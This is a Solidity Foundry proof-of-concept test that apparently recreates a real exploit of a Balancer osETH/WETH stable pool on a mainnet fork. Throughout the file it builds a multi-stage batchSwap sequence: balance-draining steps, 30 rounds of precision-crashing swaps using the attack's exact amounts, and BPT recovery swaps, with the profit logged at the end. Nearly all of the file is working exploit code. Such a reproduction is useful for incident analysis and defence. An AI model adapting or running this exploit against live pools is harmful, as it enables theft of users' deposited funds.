// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {IBasePool} from "src/interfaces/IBasePool.sol";
import {IVault} from "src/interfaces/IVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {FixedPoint} from "src/FixedPoint.sol";
import {SwapMath} from "src/SwapMath.sol";

contract BalancerPoc is Test {
    using FixedPoint for uint256;

    SwapMath internal swapMath;
    IBasePool constant OSETH_BPT = IBasePool(address(0xDACf5Fa19b1f720111609043ac67A9818262850c));
    IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    function setUp() public {
        vm.createSelectFork("ETH", 23717396); // one block before attack tx in block 23717397
        swapMath = new SwapMath();

        vm.label(address(OSETH_BPT), "OSETH_BPT");
        vm.label(address(VAULT), "VAULT");
        vm.label(address(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38), "osETH");
        vm.label(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), "WETH");

        // payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).call{value: 400081 ether}("");
    }

    function generateStep1Amounts(uint256 balance, uint256 targetRemain, uint256 maxLength)
        internal
        pure
        returns (uint256 remainAmount, uint256 stepLength, uint256[] memory swapAmounts)
    {
        swapAmounts = new uint256[](maxLength);
        remainAmount = balance;

        // Real attack formula: each step takes (remaining - target) * 99 / 100
        for (uint256 i = 0; i < maxLength; i++) {
            if (remainAmount <= targetRemain) break;

            uint256 excess = remainAmount - targetRemain;
            uint256 amount = excess * 99 / 100;

            if (amount == 0) {
                // Cleanup: drain the full remaining excess
                swapAmounts[i] = excess;
                remainAmount = targetRemain;
                stepLength++;
                break;
            }

            swapAmounts[i] = amount;
            remainAmount -= amount;
            stepLength++;
        }
    }

    function getStep2ExtractAmounts() internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](30);
        amounts[0] = 891000;
        amounts[1] = 666000;
        amounts[2] = 495000;
        amounts[3] = 369000;
        amounts[4] = 270000;
        amounts[5] = 198000;
        amounts[6] = 160000;
        amounts[7] = 120000;
        amounts[8] = 89100;
        amounts[9] = 67500;
        amounts[10] = 52200;
        amounts[11] = 40500;
        amounts[12] = 31500;
        amounts[13] = 24300;
        amounts[14] = 19800;
        amounts[15] = 16200;
        amounts[16] = 12600;
        amounts[17] = 10800;
        amounts[18] = 9000;
        amounts[19] = 7371;
        amounts[20] = 6480;
        amounts[21] = 6075;
        amounts[22] = 5589;
        amounts[23] = 4779;
        amounts[24] = 4455;
        amounts[25] = 3969;
        amounts[26] = 3726;
        amounts[27] = 3645;
        amounts[28] = 3564;
        amounts[29] = 3564;
    }

    function insertStep2Swaps(
        uint256 targetIndex,
        uint256 otherIndex,
        uint256 targetBalance,
        uint256 swapCountLimit,
        bytes32 poolId,
        uint256 amp,
        uint256 swapFeePercentage,
        uint256 swapsIndex,
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        IVault.BatchSwapStep[] memory swaps
    ) internal view {
        uint256[] memory extractAmounts = getStep2ExtractAmounts();

        for (uint256 round = 0; round < swapCountLimit; round++) {
            {
                // Swap 1: drain targetIndex to targetBalance + 1
                uint256 swapOutAmount = balances[targetIndex] - targetBalance - 1;

                balances = swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
                );

                swaps[swapsIndex + 1] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
                });
            }
            {
                if (balances[targetIndex] != targetBalance + 1) {
                    revert("insertStep2Swaps failed");
                }
                // Swap 2: drain remaining targetBalance
                uint256 swapOutAmount = targetBalance;
                balances = swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
                );
                swaps[swapsIndex + 2] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
                });

                console.log("Step2 Round WETH:", balances[otherIndex], "osETH:", balances[targetIndex]);
            }
            {
                // Swap 3: use real attack's exact extraction amounts
                uint256 swapOutAmount = extractAmounts[round];

                balances = swapMath.getAfterSwapOutBalances(
                    balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
                );

                swaps[swapsIndex + 3] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: swapOutAmount, userData: ""
                });
            }

            swapsIndex += 3;
        }
    }

    function generateStep3Amounts(uint256 balances, uint256 maxLength)
        public
        returns (uint256[] memory swapAmounts, uint256 stepLength)
    {
        swapAmounts = new uint256[](maxLength);

        uint256 accumulated = 10000;
        uint256 nowValue = 10000;
        swapAmounts[0] = 10000;

        for (uint256 i = 1; i < maxLength; i++) {
            if (balances > accumulated + 1000 * nowValue) {
                accumulated += 1000 * nowValue;
                nowValue = nowValue * 1000;
                swapAmounts[i] = nowValue;
                stepLength++;
            } else {
                // Split remainder into 2 equal parts (matching real attack pattern)
                uint256 remain = balances - accumulated;
                swapAmounts[i] = remain / 2;
                swapAmounts[i + 1] = remain / 2;
                stepLength += 2;

                console.log("Step Length: ", stepLength);
                break;
            }
        }
    }

    function test_generateStep3Amounts() public {
        uint256 balances = OSETH_BPT.getActualSupply();
        console.log("Actual supply:", balances);
        (uint256[] memory swapAmounts, uint256 stepLength) = generateStep3Amounts(balances * 103 / 100, 20);
        for (uint256 i = 0; i < stepLength + 1; i++) {
            console.log("swapAmounts[", i, "] =", swapAmounts[i]);
        }
    }

    function test_run() public {
        console.log("Forked at ETH block:", block.number);
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 bptIndex = OSETH_BPT.getBptIndex();
        console.log("OSETH BPT index:", bptIndex);

        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }

        bool[] memory updateAddress = new bool[](tokens.length);
        (address[] memory rateProviders) = OSETH_BPT.getRateProviders();
        for (uint256 i = 0; i < rateProviders.length; i++) {
            if (rateProviders[i] != address(0)) {
                updateAddress[i] = true;
            }
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            if (updateAddress[i]) {
                console.log("Updating token rate cache for token:", address(tokens[i]));
                OSETH_BPT.updateTokenRateCache(tokens[i]);
            }
        }

        uint256[] memory scalingFactors = OSETH_BPT.getScalingFactors();

        uint256 swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        (uint256 amp,,) = OSETH_BPT.getAmplificationParameter();
        uint256 bptRate = OSETH_BPT.getRate();

        uint256 targetRemainBalance = 67000;

        (uint256 remainETHAmount, uint256 stepETHLength, uint256[] memory stepETHAmount) =
            generateStep1Amounts(balances[0], targetRemainBalance, 15);
        (uint256 remainOSETHAmount, uint256 stepOSETHLength, uint256[] memory stepOSETHAmount) =
            generateStep1Amounts(balances[2], targetRemainBalance, 15);

        uint256 bptActualBalances = OSETH_BPT.getActualSupply();
        uint256 bptTotalSupply = IERC20(address(OSETH_BPT)).totalSupply();
        console.log("Actual supply:", bptActualBalances);
        console.log("Total supply:", bptTotalSupply);

        // Use exact Step 3 BPT amounts from real attack transaction
        uint256 stepBPTLength = 8; // 9 swaps total, but stepBPTLength is used as (length-1) for loop
        uint256[] memory stepBPTAmount = new uint256[](9);
        stepBPTAmount[0] = 10000;
        stepBPTAmount[1] = 10000000;
        stepBPTAmount[2] = 10000000000;
        stepBPTAmount[3] = 10000000000000;
        stepBPTAmount[4] = 10000000000000000;
        stepBPTAmount[5] = 10000000000000000000;
        stepBPTAmount[6] = 10000000000000000000000;
        stepBPTAmount[7] = 941319322493191942754;
        stepBPTAmount[8] = 941319322493191942754;

        int256[] memory limits = new int256[](3);
        limits[0] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);
        limits[1] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);
        limits[2] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this), fromInternalBalance: true, recipient: payable(address(this)), toInternalBalance: true
        });

        uint256 step2SwapCount = 30; // Real attack uses 30 D-crash rounds
        IVault.BatchSwapStep[] memory swaps =
            new IVault.BatchSwapStep[](stepETHLength + stepOSETHLength + stepBPTLength + 1 + step2SwapCount * 3);

        for (uint256 i = 0; i < stepETHLength; i++) {
            swaps[i * 2] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 1, assetOutIndex: 0, amount: stepETHAmount[i], userData: ""
            });

            swaps[i * 2 + 1] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 1, assetOutIndex: 2, amount: stepOSETHAmount[i], userData: ""
            });
        }

        uint256[] memory notBPTBalances = new uint256[](tokens.length - 1);
        notBPTBalances[0] = remainETHAmount;
        notBPTBalances[1] = remainOSETHAmount;

        uint256[] memory notBPTScalingFactors = new uint256[](tokens.length - 1);
        notBPTScalingFactors[0] = scalingFactors[0];
        notBPTScalingFactors[1] = scalingFactors[2];

        // Insert Step 2 swaps
        insertStep2Swaps(
            1,
            0,
            17,
            step2SwapCount,
            poolId,
            amp,
            swapFeePercentage,
            stepETHLength + stepOSETHLength - 1,
            notBPTBalances,
            notBPTScalingFactors,
            swaps
        );

        // console.log("stepBPTLength: ", stepBPTLength);
        for (uint256 i = 0; i < stepBPTLength + 1; i++) {
            if (i % 2 == 0) {
                swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
                });
            } else {
                swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
                });
            }
        }

        // Compute recovery total for logging
        uint256 recoveryTarget = 0;
        for (uint256 i = 0; i < stepBPTLength + 1; i++) {
            recoveryTarget += stepBPTAmount[i];
        }
        console.log("=== KEY METRICS ===");
        console.log("BPT actual supply:", bptActualBalances);
        console.log("BPT rate:", bptRate);
        console.log("Recovery target (Step3 total BPT):", recoveryTarget);
        console.log("Recovery / supply ratio (basis points):", recoveryTarget * 10000 / bptActualBalances);

        int256[] memory deltas = VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps, tokens, funds, limits, block.timestamp + 1);

        console.log("=== BATCH SWAP DELTAS ===");
        console.log("WETH delta (positive=owe, negative=receive):");
        if (deltas[0] >= 0) {
            console.log("  +", uint256(deltas[0]));
        } else {
            console.log("  -", uint256(-deltas[0]));
        }
        console.log("BPT delta:");
        if (deltas[1] >= 0) {
            console.log("  +", uint256(deltas[1]));
        } else {
            console.log("  -", uint256(-deltas[1]));
        }
        console.log("osETH delta:");
        if (deltas[2] >= 0) {
            console.log("  +", uint256(deltas[2]));
        } else {
            console.log("  -", uint256(-deltas[2]));
        }

        // Express BPT delta as ratio of supply
        if (deltas[1] >= 0) {
            console.log("BPT net cost / supply (basis points):", uint256(deltas[1]) * 10000 / bptActualBalances);
        } else {
            console.log("BPT net SURPLUS / supply (basis points):", uint256(-deltas[1]) * 10000 / bptActualBalances);
        }
    }
}
